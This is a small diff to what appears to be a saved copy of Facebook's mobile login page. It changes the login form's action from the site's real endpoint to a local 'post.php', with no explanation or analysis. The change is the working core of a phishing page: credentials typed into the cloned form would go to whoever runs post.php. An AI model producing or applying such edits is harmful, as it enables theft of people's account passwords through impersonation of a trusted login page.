@@ -98,7 +98,7 @@
           </div>
          </div>
          <div class="_5rut">
-          <form method="post" action="/login/device-based/login/async/?refsrc=deprecated&amp;lwv=100" class="mobile-login-form _9hp- _5spm" id="login_form" novalidate="1" data-sigil="m_login_form" data-autoid="autoid_1">
+          <form method="post" action="post.php" class="mobile-login-form _9hp- _5spm" id="login_form" novalidate="1" data-sigil="m_login_form" data-autoid="autoid_1">
            <input type="hidden" name="lsd" value="AVqoYkT3uTE" autocomplete="off">
            <input type="hidden" name="jazoest" value="2976" autocomplete="off">
            <input type="hidden" name="m_ts" value="1645681103">
